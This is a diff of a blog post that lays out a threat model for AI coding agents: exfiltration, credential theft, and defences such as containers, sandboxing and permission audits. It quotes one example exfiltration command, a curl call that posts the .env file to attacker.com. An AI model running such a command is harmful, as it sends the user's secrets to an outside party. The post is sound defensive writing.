@@ -47,7 +47,7 @@ This isn't hypothetical. I've seen agents wander outside the project directory d
 
 An agent with network access can send your code anywhere. It could be something obvious like `curl attacker.com -d "$(cat .env)"`, or something subtle buried in a script it generates. You probably wouldn't notice either way.
 
-This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network.
+This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network. If it's client code, that's a breach notification. If it's your own product, that's competitive intelligence in the open.
 
 We've already seen this pattern in the news where [malicious VS Code AI extensions stole source code from 1.5 million installs]({filename}/developer-tools-are-the-new-attack-surface.md). An AI coding agent with network access is the same exfiltration vector, just with more reasoning capability.
 
@@ -59,7 +59,7 @@ This already happened. A [supply chain attack on Cline CLI]({filename}/your-ai-a
 
 ### T4: Credential theft
 
-SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already [picking up AI agent configuration files and gateway tokens]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) through broad file-grabbing routines, and dedicated targeting is likely next.
+SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Stolen cloud credentials are how $50K AWS bills happen overnight. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already [picking up AI agent configuration files and gateway tokens]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) through broad file-grabbing routines, and dedicated targeting is likely next.
 
 Claude Code's own [sandboxing documentation](https://docs.anthropic.com/en/docs/claude-code/security#sandboxing) acknowledges this: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys."
 
@@ -96,6 +96,8 @@ Here's how each control currently implemented in Claudecker maps to the threats 
 | Skills hash caching | | | | | | ✅ | | |
 
 Some of these are strong mitigations. Others are just friction. I want to be honest about which is which.
+
+Container isolation, ephemeral sessions, and SSH agent forwarding are the strong ones. The agent genuinely cannot access what isn't mounted, keys that aren't stored, or configs that get rebuilt every launch. The network firewall is effective but has gaps I haven't closed yet (IPv6, CDN IP rotation). Profile isolation works if you remember to set it. Details on each below.
 
 ### Container isolation (mitigates T1, T3, T4)
 
@@ -168,12 +170,12 @@ I'm choosing tighter controls now because new threats keep showing up weekly. Th
 
 Claudecker isn't publicly available. It's deeply integrated into my personal workflow and not something anyone else can pick up and run. But you don't need my tool to act on this threat model. Here are four things you can do right now:
 
-1. **Run your AI agent in a container.** You don't need Claudecker for this. A basic Docker container with your project directory mounted already gives you most of the mitigation table above. The agent gets filesystem isolation, credential separation, and a throwaway environment. That alone covers T1, T4, and T8.
+1. **Audit your `settings.local.json` (5 minutes).** Open `.claude/settings.local.json` in your project directory and look at what you've approved. You might find `Bash(sudo:*)` or other broad patterns you don't remember approving. Clean it up.
 
-2. **Enable Claude Code's built-in sandbox.** Run `/sandbox` in a session. It's not as strict as a container, but it restricts file writes to the working directory and routes network traffic through a domain-approving proxy. It's there, it's free, and most people don't know about it. [Documentation here](https://code.claude.com/docs/en/sandboxing).
+2. **Enable Claude Code's built-in sandbox (1 command).** Run `/sandbox` in a session. It's not as strict as a container, but it restricts file writes to the working directory and routes network traffic through a domain-approving proxy. It's there, it's free, and most people don't know about it. [Documentation here](https://code.claude.com/docs/en/sandboxing).
 
-3. **Audit your `settings.local.json`.** Open `.claude/settings.local.json` in your project directory and look at what you've approved. You might find `Bash(sudo:*)` or other broad patterns you don't remember approving. Clean it up.
+3. **Run your AI agent in a container (30 minutes if you know Docker, half a day if you don't).** A basic Docker container with your project directory mounted already gives you most of the mitigation table above. The agent gets filesystem isolation, credential separation, and a throwaway environment. That alone covers T1, T4, and T8.
 
-4. **Review what skills and MCP servers your agent loads.** Each one is third-party code running with your agent's permissions. Check what's installed, where it came from, and whether you still need it. A skill or MCP server you forgot about is an unmonitored attack surface. If you find one you rely on, consider forking it into your own repo. Writing your own skills is even better. It doesn't scale, but at least you know exactly what's running.
+4. **Review what skills and MCP servers your agent loads (10 minutes).** Each one is third-party code running with your agent's permissions. Check what's installed, where it came from, and whether you still need it. A skill or MCP server you forgot about is an unmonitored attack surface. If you find one you rely on, consider forking it into your own repo. Writing your own skills is even better. It doesn't scale, but at least you know exactly what's running.
 
 None of these require building anything. They're just decisions.
